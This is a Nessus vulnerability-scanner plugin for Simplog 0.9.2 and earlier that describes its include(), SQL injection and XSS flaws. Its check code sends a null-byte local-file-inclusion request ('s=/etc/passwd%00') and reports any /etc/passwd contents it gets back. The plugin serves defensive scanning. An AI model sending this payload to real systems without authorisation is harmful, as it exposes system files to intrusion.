#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is susceptible to
multiple issues. 

Description :

The remote host is running Simplog, an open-source blogging tool
written in PHP. 

The version of Simplog installed on the remote host fails to sanitize
input to the 's' parameter of the 'doc/index.php' script before using
it in a PHP 'include()' function.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

In addition, it also reportedly is affected by various SQL injection,
cross-site scripting, and information disclosure vulnerabilities. 

See also :

http://www.securityfocus.com/archive/1/430743/30/0/threaded
http://www.simplog.org/bugs/bug.php?op=show&bugid=57
http://www.simplog.org/archive.php?blogid=1&pid=56

Solution :

Upgrade to Simplog 0.9.3 or later.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21224);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-1776", "CVE-2006-1777", "CVE-2006-1778", "CVE-2006-1779");
  script_bugtraq_id(17490, 17491, 17493);
  if (defined_func("script_xref"))
  {
    script_xref(name:"OSVDB", value:"24559");
    script_xref(name:"OSVDB", value:"24560");
    script_xref(name:"OSVDB", value:"24561");
    script_xref(name:"OSVDB", value:"24562");
  }

  script_name(english:"Simplog <= 0.9.2 Multiple Vulnerabilities");
  script_summary(english:"Tries to read /etc/passwd using Simplog");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/simplog", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/doc/index.php?",
      "s=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # It's from Simplog and..
    'href="index.php?s=user">User\'s Guide</a>' >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but an attacker with
      #     local access and/or remote file inclusion might still work.
      egrep(pattern:"main\(/etc/passwd\\0\.html.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, "User's Guide");
      if (contents) contents = strstr(contents, "<p>");
      if (contents) contents = contents - "<p>";
      if (contents) contents = contents - strstr(contents, "</p>");
    }

    if (isnull(contents)) report = desc;
    else
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
